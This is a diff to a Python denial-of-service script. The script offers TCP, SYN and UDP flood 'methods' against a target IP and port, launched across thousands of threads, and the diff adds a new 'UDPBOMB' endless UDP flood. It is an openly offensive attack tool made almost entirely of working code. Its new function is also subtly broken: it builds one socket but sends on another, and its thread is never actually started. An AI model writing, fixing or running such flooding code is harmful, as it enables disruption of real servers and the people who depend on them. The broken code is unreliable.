@@ -1,4 +1,4 @@
-#RymuxINV #TulsDingdos
+#RymuxINV #DingDusTuls
 import random
 import time
 import os
@@ -37,15 +37,16 @@ banner = """
 \033[91m|   TCP    | 80  | 3389 |
 \033[91m|   SYN    | 80  | 3389 |
 \033[91m|   UDP    |17091| 7777 |
+\033[91m] UDPBOMB  |17091| 7777 |
 \033[91m|----------|------------|
 """
 
 print(banner)
 "n/"
 method = str(input("Enter Method >> "))
-if method == "TCP" or method == "SYN" or method == "UDP":
+if method == "TCP" or method == "SYN" or method == "UDP" or method == "UDPBOMB":
     print("METHOD VALID! PLEASE WAIT..")
-    time.sleep(2.5)
+    time.sleep(2.0)
 else:
     print("ERROR! METHOD INVALID!")
     time.sleep(20)
@@ -94,7 +95,31 @@ def UDP():
         except socket.error:
             print(f"Attacking On {ip}:{port} with UDP")
             sock.close()
-            
+ 
+def UDPBOMB():
+ packet = random.randint(1024, 8192)
+ byte_packet = random._urandom(packet)
+    
+ while True:
+     try:
+          data = bytearray(56656)
+          data[0] = 0x1B
+          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+          s.setsockopt(socket.SOL_SOCKET, socket .SO_SNDBUF, 65507)
+          sock.connect((ip,port))
+          sock.send(byte_packet)
+          sock.send(byte_packet)
+          for x in range(times):
+             sock.sendall(byte_packet)
+             sock.sendall(byte_packet)
+          print(f"Attacking On {ip}:{port} with UDP")
+     except socket.error:
+          print(f"Attacking On {ip}:{port} with UDP")
+          sock.close()
+    
+        
 def SYN():
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
     sock.connect((ip, port))
@@ -113,9 +138,14 @@ for y in range(9024):
     if method == "TCP":
         t = threading.Thread(target =TCP)
         t.start()
+    elif method == "UDPBOMB":
+        t = threading.Thread(target =UDPBOMB)
+        t.start
     elif method == "UDP":
         t = threading.Thread(target =UDP)
         t.start()
     elif method == "SYN":
         t = threading.Thread(target =SYN)
         t.start()
+
+
